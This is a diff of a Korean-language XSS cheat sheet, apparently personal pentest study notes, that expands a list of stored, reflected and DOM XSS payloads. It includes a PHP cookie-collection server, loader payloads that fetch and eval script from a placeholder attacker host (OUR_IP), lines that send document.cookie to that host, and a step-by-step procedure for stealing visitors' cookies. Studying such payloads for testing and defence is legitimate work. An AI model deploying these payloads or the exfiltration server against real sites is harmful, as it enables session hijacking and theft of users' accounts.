@@ -1,22 +1,87 @@
-# XSS
-## Stored XSS
+# XSS (Cross-Site Scripting)
+## 기본 공격 페이로드
+### 스크립트 태그 기반
 ```html
+<!-- 기본 alert 실행 -->
 <script>alert(window.origin)</script>
 <script>alert(document.cookie)</script>
+<script>alert('XSS')</script>
+
+<!-- 콘솔 로그 출력 -->
+<script>console.log(document.cookie)</script>
+```
+
+### 이벤트 핸들러 기반
+```html
+<!-- 이미지 로드 실패 시 스크립트 실행 -->
+<img src="" onerror=alert(window.origin)>
+<img src=x onerror=alert(document.cookie)>
+
+<!-- 다양한 이벤트 핸들러 활용 -->
+<img src=x onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<svg onload=alert('XSS')>
+```
+
+### HTML 태그 속성 활용
+
+```html
+<!-- a 태그의 href 속성 -->
+<a href="javascript:alert('XSS')">Click me</a>
+
+<!-- iframe 활용 -->
+<iframe src="javascript:alert('XSS')"></iframe>
+```
+
+---
+## Stored XSS (저장형 XSS)
+
+**설명:** 악성 스크립트가 서버의 데이터베이스에 저장되어, 다른 사용자가 해당 페이지를 방문할 때마다 스크립트가 실행되는 공격입니다. 게시판, 댓글, 프로필 등에서 주로 발생합니다.
+
+### 공격 페이로드
+
+```html
+<!-- 현재 origin 정보를 alert로 출력 -->
+<script>alert(window.origin)</script>
+
+<!-- 쿠키 정보를 alert로 출력 -->
+<script>alert(document.cookie)</script>
+
+<!-- 인쇄 대화상자 호출 -->
 <script>print()</script>
+
+<!-- 이후 모든 HTML을 평문으로 처리 (페이지 렌더링 중단) -->
 <plaintext>
 ```
+
 <img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />
 
-## Reflected XSS
-- 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행
+---
+## Reflected XSS (반사형 XSS)
+
+**설명:** 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행되는 공격입니다. 주로 검색 쿼리, 에러 메시지 등에서 발생합니다.
+
+### 공격 페이로드
+
 ```html
+<!-- 기본 스크립트 삽입 -->
 <script>alert(window.origin)</script>
 ```
+
+**예시:** `http://example.com/search?q=<script>alert(window.origin)</script>`
+
 <img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />
 
-## DOM XSS
+---
+## DOM XSS (DOM 기반 XSS)
+
+**설명:** 클라이언트 측 JavaScript 코드가 사용자 입력을 안전하지 않게 처리할 때 발생하는 XSS입니다. 서버를 거치지 않고 브라우저의 DOM을 직접 조작하여 공격이 이루어집니다.
+
+### 취약한 JavaScript 함수들
+
 ```html
+<!-- 동적으로 HTML을 작성하는 함수들 -->
 document.write()
 DOM.innerHTML
 DOM.outerHTML
@@ -25,13 +90,19 @@ after()
 append()
 ```
 
-## advanced
-```html
-<img src="" onerror=alert(window.origin)>
-```
+**주의:** 이러한 함수들에 사용자 입력이 필터링 없이 전달되면 XSS 공격에 취약합니다.
+
+---
+## Advanced XSS 기법
+
+**설명:** 외부 서버와 연동하여 쿠키를 탈취하거나, 복잡한 페이로드를 체이닝하는 고급 공격 기법입니다.
+
+### 1. 쿠키 탈취 서버 구축
+
+**PHP 서버 측 코드 (index.php):**
 ```php
-# index.php
 <?php
+# 쿠키 정보를 받아서 cookies.txt 파일에 저장
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
     foreach ($list as $key => $value) {
@@ -43,22 +114,49 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
+
+**서버 실행:**
 ```bash
+# PHP 내장 웹 서버를 80포트로 실행
 sudo php -S 0.0.0.0:80
 ```
+
+### 2. 다양한 스크립트 삽입 페이로드
+
 ```html
+<!-- 외부 스크립트 파일 로드 -->
 <script src=http://OUR_IP></script>
 '><script src=http://OUR_IP></script>
 "><script src=http://OUR_IP></script>
+
+<!-- JavaScript URI를 통한 스크립트 실행 -->
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+
+<!-- XMLHttpRequest를 이용한 스크립트 로드 -->
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+
+<!-- jQuery를 이용한 스크립트 로드 -->
 <script>$.getScript("http://OUR_IP")</script>
 ```
+
+### 3. 쿠키 탈취 스크립트 (script.js)
+
 ```html
-# script.js
+<!-- document.location을 이용한 리다이렉트 -->
 document.location='http://OUR_IP/index.php?c='+document.cookie;
+
+<!-- Image 객체를 이용한 백그라운드 전송 (사용자가 인지하기 어려움) -->
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
+
+### 4. 공격 실행 예시
+
 <img width="832" height="704" alt="image" src="https://github.com/user-attachments/assets/3aa72f40-1ead-4db1-8c05-68c42ad656cf" />
 
-- 각각의 input에다가 테스트 후에 XSS 취약점 input에다가 `script.js`를 요청하여 cookie를 얻어냄.
+**공격 절차:**
+1. 각각의 input 필드에 XSS 페이로드를 테스트
+2. XSS 취약점이 있는 input을 식별
+3. 해당 input에 `script.js`를 요청하는 페이로드 삽입
+4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨
+
+---
